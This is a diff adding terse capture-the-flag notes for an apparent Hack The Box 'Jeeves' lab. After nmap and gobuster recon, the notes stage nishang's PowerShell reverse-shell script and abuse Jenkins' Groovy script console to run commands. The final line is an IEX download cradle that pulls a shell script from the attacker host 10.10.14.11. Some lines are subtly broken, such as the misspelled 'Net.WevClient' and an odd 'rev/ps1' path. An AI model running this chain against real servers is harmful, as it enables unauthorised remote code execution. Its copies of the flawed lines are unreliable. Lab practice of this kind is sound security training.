@@ -1,0 +1,19 @@
+nmap -sC -sV -oA nmap/initial 10.10.10.63
+
+gobuster -u http://10.10.10.63 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 15
+
+Save output and target specific:
+
+gobuster -u http://10.10.10.63:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 15 -o apache.txt
+
+Powershell tools:
+https://github.com/samratashok/nishang
+
+root@oscp:/opt/powershell/nishang/Shells# cp Invoke-PowerShellTcp.ps1 ~/Documents/htb/jeeves/www
+
+http://10.10.10.63:50000/askjeeves/script:
+cmd = """ cmd.exe /c echo "Hello World" """
+println cmd.execute().text
+
+cmd = """ powershell "IEX(New-Object Net.WevClient).downloadString('http://10.10.14.11/rev/ps1')" """
+println cmd.execute().text
